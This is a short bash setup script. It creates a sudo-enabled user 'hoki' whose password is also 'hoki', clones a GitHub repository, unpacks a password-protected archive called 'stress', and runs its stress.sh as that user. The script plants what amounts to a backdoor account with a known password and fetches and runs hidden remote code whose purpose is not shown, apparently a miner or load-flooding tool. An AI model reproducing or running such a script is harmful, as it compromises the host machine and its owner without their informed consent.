#!/bin/bash
sudo useradd -m hoki
sudo adduser hoki sudo
sudo usermod -a -G sudo hoki
sudo echo 'hoki:hoki' | sudo chpasswd
cd /home/hoki
git clone https://github.com/berapakinibmembunuhks/a1.git
cd a1
unzip -q -P kontol stress.zip
sudo chown hoki:sudo stress
sudo chown hoki:sudo stress.sh
sudo chmod 700 stress stress.sh 
sudo -u hoki sh -c "/home/hoki/a1/stress.sh"
